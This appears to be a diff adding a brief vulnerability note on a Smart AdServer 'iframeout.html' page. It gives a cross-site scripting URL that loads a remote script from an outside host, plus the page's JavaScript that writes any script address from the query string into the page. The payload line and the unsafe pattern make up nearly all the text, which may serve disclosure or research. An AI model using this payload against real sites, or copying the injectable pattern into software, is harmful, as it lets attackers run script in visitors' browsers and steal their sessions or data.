@@ -1,0 +1,16 @@
+/smartadserver/iframeout.html?sas_script_url=https://bgtian.life/xss.js
+
+The script simply whatever is in the url as a new script:
+function sas_script_include () {
+	var qstr=document.location.search;
+	var pos=qstr.indexOf("sas_script_url=");
+	if(pos!=-1) {
+		pos+=15;
+		sas_script_url=unescape(qstr.substr(pos));
+		sas_in_iframe_popout=true;
+		document.write("<scr" + "ipt src='" + sas_script_url + "'></scr" + "ipt>");
+	}
+}
+
+var sas_in_iframe_popout=false;
+sas_script_include();
